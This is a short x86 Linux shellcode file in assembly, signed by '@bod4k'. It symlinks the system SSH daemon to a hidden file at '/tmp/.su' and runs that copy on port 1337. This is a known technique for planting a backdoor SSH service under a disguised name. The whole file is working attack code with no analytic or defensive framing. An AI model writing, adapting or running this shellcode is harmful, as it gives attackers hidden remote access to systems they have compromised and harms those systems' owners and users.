section .text
 global _start:

_start:
	
	  ; symlink("/usr/sbin/sshd", "/tmp/.su")
    ; by @bod4k

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov bx, 0x6468

	push ebx
	push 0x73732f6e
	push 0x6962732f
	push 0x7273752f

	mov ebx, esp

	mov al, 83

	push ecx
	push 0x75732e2f
	push 0x706d742f

	mov ecx, esp

	int 0x80

	; execve("/tmp/.su", ["/tmp/.su","-oPort=1337"], [ NULL ])

	xor eax, eax
	xor ebx, ebx
	xor edx, edx

	mov ebx, ecx

	push eax
	push 0x37333331
	push 0x333d7472
	push 0x6f506f2d

	mov ecx, esp

	push eax
	push ecx
	push ebx

	mov ecx, esp

	mov al, 11

	int 0x80
